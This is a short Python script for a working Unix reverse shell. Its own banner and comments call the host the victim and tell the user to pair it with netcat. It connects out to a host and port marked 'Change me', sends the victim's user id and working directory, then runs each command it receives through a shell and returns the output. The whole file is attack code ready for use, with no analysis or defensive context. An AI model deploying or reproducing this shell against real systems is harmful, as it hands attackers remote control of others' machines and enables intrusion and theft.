import socket
import os
import subprocess
import sys
#SUDO DOES NOT WORK!!!!
#Define constants 
PORT = 1234 #Change me 
HOST = "127.0.0.1" #Change me
isalive = False

def initiate():
    global isalive,sock
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #Creates a IPv4 Socket using TCP to transmit data on victim side
        sock.connect((HOST,PORT)) #Tuple is used
        isalive = True
        print("[+]: Connection Accepted") #Please note all strings in print lines are just for design purposes
        id =  subprocess.getoutput("id").encode()
        pwd = subprocess.getoutput("pwd").encode()   
        sock.send(b"\n###################\n###################\n###################\n###################\nUNIX REVERSE SHELL\n\n\nUSE WITH NETCAT OR YOUR OWN LISTENER")
        sock.send(b"CURRENT USER:\n" + id + b"\n\n")
        sock.send(b"DIRECTORY:\n" + pwd+ b"\n")
    except socket.error as error:
        print(f"[!]: {error}") 
        killhost()
        

def killhost():
    sock.close()
    print("KILLED")
    return sys.exit(1)

def Process():
    global sock,message
    try:
        sock.send(b"\n#")
        message = sock.recv(2048).decode()
        print(message)
    except socket.error as e:
        print(e)
        killhost()
    Handler()        
    


def Handler():
    if "exit" in message:
        killhost()
    if "cd " in message:
        _, target_dir = message.split("cd ", 1)
        target_dir = target_dir.strip()
        try:
            os.chdir(target_dir)
        except Exception as e:
            sock.send(str(e).encode())
    else:
        try:
            output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
            sock.send(output)     
        except subprocess.CalledProcessError as e:
            sock.send(str(e).encode() +subprocess.getoutput(message).encode())
        


if __name__ == "__main__":
    global sock
    initiate()
    while isalive:
        Process()
    killhost()

        